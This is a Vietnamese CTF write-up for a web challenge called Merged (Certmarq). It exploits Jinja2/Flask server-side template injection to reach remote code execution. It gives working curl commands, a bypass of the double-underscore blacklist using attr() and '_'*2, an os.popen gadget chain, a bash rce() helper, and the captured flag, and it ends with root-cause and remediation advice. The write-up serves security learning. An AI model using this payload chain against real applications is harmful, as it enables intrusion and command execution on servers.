@@ -1,0 +1,198 @@
+---
+title: "[CTF Writeup] Web — Merged (Certmarq) — SSTI to RCE"
+description: "Writeup chi tiết challenge web Merged (Certmarq). Khai thác lỗ hổng Server-Side Template Injection (SSTI) trên Jinja2/Flask, bypass filter và build chain RCE húp trọn flag."
+date: "2026-09-28"
+tags: ["CTF", "Writeup", "Web", "SSTI", "Jinja2", "Flask", "RCE"]
+---
+
+**Challenge:** Merged (Certmarq)  
+**Platform:** WebVerse Labs  
+**Category:** Web Exploitation  
+**Tags:** `SSTI`, `Jinja2`, `Flask`, `Filter Bypass`, `RCE`
+
+## 0x00. Giới thiệu & TL;DR
+
+Chào anh em, lại là mình đây! Cuối tuần vừa rồi mình có dạo qua WebVerse Labs và vớ được một challenge web khá thú vị mang tên **"Merged"**. Target là nền tảng Certmarq — một web app hỗ trợ thiết kế và cấp phát chứng chỉ khóa học.
+
+Lướt qua các tính năng ban đầu thì app này trông giống hệt một cái CRUD template đơn giản. Nhưng ẩn sâu bên dưới chức năng Preview lại tiềm ẩn một lỗ hổng **Server-Side Template Injection (SSTI)** to đùng trên nền tảng Jinja2/Flask. Dù author đã cố tình set up một lớp filter blacklist nhẹ nhàng, nhưng chỉ với vài trick bypass cơ bản là anh em mình đã có thể pop shell và hốt flag về tay.
+
+Dưới đây là toàn bộ writeup chi tiết từ khâu recon, fuzzing, bypass filter cho đến RCE. Toàn bộ thao tác mình đều thực hiện "hardcore" trực tiếp bằng `curl` trên Linux terminal cho nhanh gọn lẹ nhé. Lên bài thôi!
+
+## 0x01. Recon & Thám thính ứng dụng
+
+**Target URL:** `https://5fafc273-6109-merged-8d76a.mystery-challenges.webverselabs-pro.com/`
+
+Khởi đầu bằng việc dạo quanh trang chủ, giao diện hiển thị landing page khá sạch sẽ với slogan: *"Certmarq — verifiable course certificates"*.
+
+Rà soát nhanh qua các endpoint chính của app:
+- `/register`, `/login`, `/verify`
+- Sau khi đăng nhập: `/dashboard`, `/designer`, `/issue`, `/certificates`
+
+Để tiếp cận sâu hơn, mình dựng ngay một script bash ngắn gọn để tạo nhanh một tài khoản tổ chức (issuer) và lưu session cookie phục vụ cho các bước sau:
+
+```bash
+BASE="https://5fafc273-6109-merged-8d76a.mystery-challenges.webverselabs-pro.com"  
+COOKIE="cookies.txt"  
+EMAIL="pwn$RANDOM@example.com"  
+PASS="password123"
+
+curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$BASE/register" \
+  --data-urlencode "org_name=TestOrg" \
+  --data-urlencode "email=$EMAIL" \
+  --data-urlencode "password=$PASS"
+```
+
+Đăng nhập xong, mình mò ngay vào tính năng **Template Designer** (`/designer`). Điểm đáng chú ý đập vào mắt là một form request `POST /designer/preview` với trường `body` cho phép nhập HTML tùy biến. Nó còn hỗ trợ các merge field định dạng như:
+`{{ recipient.name }}`, `{{ course.title }}`, `{{ issue_date }}`, `{{ issuer.org }}`.
+
+> **Mùi SSTI nồng nặc ở đây chứ đâu!** Cú pháp cặp ngoặc nhọn `{{ ... }}` là signature kinh điển của Jinja2 (Flask/Python).
+
+Ngoài ra, hệ thống còn kèm thêm dòng warning đầy tính khiêu khích:  
+*"For safety, every template runs through our content filter before it renders."*  
+
+Có filter thì việc của anh em mình là đục filter thôi!
+
+## 0x02. Xác nhận lỗ hổng SSTI
+
+Để xác minh xem ứng dụng có thực sự render template động từ user input hay không, mình quăng ngay quả payload toán học quen thuộc: `{{ 7*7 }}`.
+
+```bash
+curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$BASE/designer/preview" \
+  --data-urlencode "body=<p>{{ 7*7 }}</p>"
+```
+
+**Response trả về:**
+```html
+<div class="cert-body"><p>49</p></div>
+```
+
+Phép tính `7 * 7` đã được evaluate thành `49`. SSTI confirmed 100%! Engine hoạt động phía sau chắc chắn là Jinja2 trên nền Flask.
+
+## 0x03. Dò Filter & Kiểm tra giới hạn
+
+Bước tiếp theo là thăm dò xem cái "safety filter" của bài này chặn những gì.
+Trước hết, test gọi biến môi trường cơ bản của Flask:
+
+```bash
+curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$BASE/designer/preview" \
+  --data-urlencode "body={{ config }}"
+```
+
+-> **Thành công!** Kết quả trả về toàn bộ Flask `config` dictionary, bao gồm cả `SECRET_KEY`. Quá hời!
+
+Tiếp tục thử chuỗi payload introspection kinh điển để mò class:
+
+```bash
+curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$BASE/designer/preview" \
+  --data-urlencode "body={{ ''.__class__ }}"
+```
+
+Lúc này, server ném thẳng vào mặt mình một cái lỗi:
+`Preview error — Template rejected by our safety filter — the pattern "__" is not allowed in certificate templates.`
+
+Thì ra filter đơn thuần chỉ là một blacklist check sự xuất hiện của chuỗi `__` (double underscore) trong raw template. Một cách def hơi ngây thơ trong thế giới Jinja2!
+
+## 0x04. Kỹ thuật Bypass Filter "__"
+
+Trong Jinja2, ta hoàn toàn có thể tận dụng built-in filter `attr()` (tương đương với hàm `getattr()` trong Python) để gọi thuộc tính động.
+
+Để né việc gửi chuỗi `__` trong code template thô, mình sẽ tự ghép chuỗi lúc runtime bằng biểu thức `'_' * 2`. Nhờ vậy, payload gửi qua mạng hoàn toàn không chứa hai dấu gạch dưới liền kề nhau:
+
+```bash
+curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$BASE/designer/preview" \
+  --data-urlencode "body={{ ''|attr('_' * 2 + 'class' + '_' * 2) }}"
+```
+
+**Kết quả nhận được:**
+```html
+<div class="cert-body"><class 'str'></div>
+```
+
+Boom! Lớp filter blacklist đã bị bypass hoàn toàn một cách mượt mà. 
+Để payload trông gọn gàng và dễ đọc hơn khi build gadget chain phức tạp, ta có thể dùng tag `set` để gán biến:
+```jinja2
+{% set u = '_' * 2 %}
+```
+
+## 0x05. Xây dựng Payload Gadget Chain RCE
+
+Sau khi đã bypass được hạn chế gọi attribute, mục tiêu kế tiếp là leo từ object hiện có tới hàm `os.popen` để thực thi lệnh hệ thống. Quá trình leo cụ thể như sau:
+
+1. Xuất phát từ object `config` (Flask Config đã leak ở trên).
+2. Lấy class: `config.__class__` -> qua `attr(u+'class'+u)`.
+3. Lấy hàm init: `.__init__` -> qua `attr(u+'init'+u)`.
+4. Truy xuất globals: `.__globals__` -> qua `attr(u+'globals'+u)`.
+5. Trong `__globals__` của Flask config module có chứa sẵn module `os`.
+6. Gọi hàm `os.popen(cmd).read()`.
+
+**Payload hoàn chỉnh siêu gọn:**
+```jinja2
+{% set u = '_' * 2 %}{{ (config|attr(u+'class'+u)|attr(u+'init'+u)|attr(u+'globals'+u))['os']|attr('popen')('id')|attr('read')() }}
+```
+
+*(Lưu ý nhỏ: Khi truy cập index/key dictionary `['os']` ngay sau pipe filter `|attr(...)`, cú pháp Jinja2 sẽ báo lỗi syntax nếu không đóng mở ngoặc đơn bao bọc cả biểu thức trước đó lại thành `( ... )['os']`).*
+
+Quất thử lệnh `id` xem nào:
+
+```bash
+PAYLOAD="{% set u = '_' * 2 %}{{ (config|attr(u+'class'+u)|attr(u+'init'+u)|attr(u+'globals'+u))['os']|attr('popen')('id')|attr('read')() }}"
+
+curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$BASE/designer/preview" \
+  --data-urlencode "body=$PAYLOAD"
+```
+
+**Kết quả:**
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+RCE thành công rực rỡ, ta đã có quyền thực thi lệnh shell dưới quyền user `www-data`!
+
+## 0x06. Khai thác & Lấy Flag
+
+Để thao tác shell thoải mái hơn mà không phải lặp lại lệnh curl dài dòng, mình viết luôn một hàm bash helper `rce()` nhỏ gọn để tự động trích xuất nội dung output:
+
+```bash
+rce() {
+  local cmd="$1"
+  local payload="{% set u = '_' * 2 %}{{ (config|attr(u+'class'+u)|attr(u+'init'+u)|attr(u+'globals'+u))['os']|attr('popen')('$cmd')|attr('read')() }}"
+  curl -s -c "$COOKIE" -b "$COOKIE" -X POST "$BASE/designer/preview" \
+    --data-urlencode "body=$payload" | grep -oP '(?<=<div class="cert-body">).*?(?=</div>)'
+}
+```
+
+Kiểm tra thư mục gốc:
+```bash
+rce "ls -la /"
+```
+
+**Output:**
+```text
+-rw-r--r--   1 www-data www-data   43 Sep 26 09:20 flag.txt  
+drwxr-xr-x   1 www-data www-data 4096 Sep 26 00:04 app  
+...
+```
+
+Tuyệt vời, file `flag.txt` nằm lù lù ngay ở root directory. Đọc flag thôi!
+
+```bash
+rce "cat /flag.txt"
+```
+
+**Flag thu được:**
+```text
+WEBVERSE{eef1ecfc9256f55b8cc568023eb6513f}
+```
+Ngọt nước!
+
+## 0x07. Root Cause Analysis & Bài học rút ra
+
+- **Bản chất lỗ hổng:** Server-Side Template Injection (SSTI) dẫn đến Remote Code Execution (RCE).
+- **Nguyên nhân gốc rễ (Root Cause):** Backend sử dụng trực tiếp hàm `render_template_string()` trên chuỗi template do người dùng gửi lên từ frontend thay vì chỉ dùng một cơ chế thay thế biến an toàn (safe placeholder/interpolation).
+- **Phân tích cách phòng thủ sai lầm:** Ứng dụng áp dụng blacklist substring chặn mỗi chuỗi `__`. Đây là giải pháp nửa vời vì Jinja2 là một ngôn ngữ biểu thức rất linh hoạt. Kẻ tấn công có thể dễ dàng khởi tạo chuỗi cấm tại runtime (`'_' * 2`) và sử dụng filter `attr()` để triệu hồi bất kỳ thuộc tính hoặc phương thức ẩn nào.
+- **Biện pháp khắc phục (Remediation):**
+  1. **Không render input thô:** Không bao giờ truyền trực tiếp input của người dùng vào `render_template_string()`.
+  2. **Dùng Sandbox:** Nếu bắt buộc phải cho phép người dùng tùy biến giao diện bằng Jinja2, hãy sử dụng môi trường `jinja2.sandbox.SandboxedEnvironment` hoặc `ImmutableSandboxedEnvironment`, đồng thời cấu hình whitelist attribute nghiêm ngặt.
+  3. **Giải pháp tối ưu nhất:** Tự thiết kế một merge-field engine riêng biệt (Non-Turing Complete) bằng regex đơn giản để tìm và thay thế các token như `{{ recipient.name }}` thành dữ liệu tương ứng, qua đó loại bỏ hoàn toàn khả năng thực thi code Python.
+
+*Happy Hacking & See you in the next challenge!*
